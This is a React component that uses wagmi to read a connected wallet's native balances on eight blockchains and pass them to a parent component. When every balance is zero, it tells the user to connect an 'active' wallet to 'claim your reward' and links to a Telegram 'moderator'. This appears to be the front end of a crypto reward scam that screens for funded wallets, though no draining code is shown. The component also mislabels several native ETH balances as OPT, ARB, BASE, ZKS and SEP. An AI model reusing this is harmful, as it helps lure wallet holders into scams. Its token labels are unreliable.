import React, { useEffect } from 'react';
import { useBalance, useAccount } from 'wagmi';
import { mainnet, polygon, bsc, sepolia, optimism, arbitrum, base, zkSync } from 'wagmi/chains';
import styles from './WalletBalances.module.css';

const WalletBalances = ({ onBalancesChange }) => {
  const { address, isConnected } = useAccount();

  // Fetch balances on various chains
  const { data: ethBalance } = useBalance({ address, chainId: mainnet.id });
  const { data: maticBalance } = useBalance({ address, chainId: polygon.id });
  const { data: bnbBalance } = useBalance({ address, chainId: bsc.id });
  const { data: sepoliaBalance } = useBalance({ address, chainId: sepolia.id });
  const { data: optimismBalance } = useBalance({ address, chainId: optimism.id });
  const { data: arbitrumBalance } = useBalance({ address, chainId: arbitrum.id });
  const { data: baseBalance } = useBalance({ address, chainId: base.id });
  const { data: zkSyncBalance } = useBalance({ address, chainId: zkSync.id });

  // Notify the parent component of balance changes
  useEffect(() => {
    onBalancesChange({
      ethBalance: ethBalance?.formatted || '0',
      maticBalance: maticBalance?.formatted || '0',
      bnbBalance: bnbBalance?.formatted || '0',
      sepoliaBalance: sepoliaBalance?.formatted || '0',
      optimismBalance: optimismBalance?.formatted || '0',
      arbitrumBalance: arbitrumBalance?.formatted || '0',
      baseBalance: baseBalance?.formatted || '0',
      zkSyncBalance: zkSyncBalance?.formatted || '0',
    });
  }, [
    ethBalance,
    maticBalance,
    bnbBalance,
    sepoliaBalance,
    optimismBalance,
    arbitrumBalance,
    baseBalance,
    zkSyncBalance,
    onBalancesChange,
  ]);

  const allBalancesZero =
    (!ethBalance || parseFloat(ethBalance?.formatted || '0') === 0) &&
    (!maticBalance || parseFloat(maticBalance?.formatted || '0') === 0) &&
    (!bnbBalance || parseFloat(bnbBalance?.formatted || '0') === 0) &&
    (!sepoliaBalance || parseFloat(sepoliaBalance?.formatted || '0') === 0) &&
    (!optimismBalance || parseFloat(optimismBalance?.formatted || '0') === 0) &&
    (!arbitrumBalance || parseFloat(arbitrumBalance?.formatted || '0') === 0) &&
    (!baseBalance || parseFloat(baseBalance?.formatted || '0') === 0) &&
    (!zkSyncBalance || parseFloat(zkSyncBalance?.formatted || '0') === 0);

  if (!isConnected) {
    return <div className={styles.connectMessage}>Please connect your wallet.</div>;
  }

  if (allBalancesZero) {
    return (
      <div className={styles.inactiveWallet}>
        <p>Inactive wallet, kindly connect an active wallet to claim your reward.</p>
        <p>
          Click to contact the moderator:{" "}
          <a href="https://t.me/kanau" target="_blank" rel="noopener noreferrer">
            Moderator
          </a>
        </p>
      </div>
    );
  }

  return (
    <div className={styles.walletBalances}>
      <h3 className={styles.title}>Wallet Details</h3>
      <p className={styles.walletAddress}>{address}</p>
      <div className={styles.balancesContainer}>
        {ethBalance && parseFloat(ethBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Ethereum (ETH):</span> {ethBalance.formatted} ETH
          </p>
        )}
        {maticBalance && parseFloat(maticBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Polygon (MATIC):</span> {maticBalance.formatted} MATIC
          </p>
        )}
        {bnbBalance && parseFloat(bnbBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Binance Smart Chain (BNB):</span> {bnbBalance.formatted} BNB
          </p>
        )}
        {sepoliaBalance && parseFloat(sepoliaBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Sepolia (SEP):</span> {sepoliaBalance.formatted} SEP
          </p>
        )}
        {optimismBalance && parseFloat(optimismBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Optimism (OPT):</span> {optimismBalance.formatted} OPT
          </p>
        )}
        {arbitrumBalance && parseFloat(arbitrumBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Arbitrum (ARB):</span> {arbitrumBalance.formatted} ARB
          </p>
        )}
        {baseBalance && parseFloat(baseBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Base (BASE):</span> {baseBalance.formatted} BASE
          </p>
        )}
        {zkSyncBalance && parseFloat(zkSyncBalance?.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>zkSync (ZKS):</span> {zkSyncBalance.formatted} ZKS
          </p>
        )}
      </div>
    </div>
  );
};

export default WalletBalances;
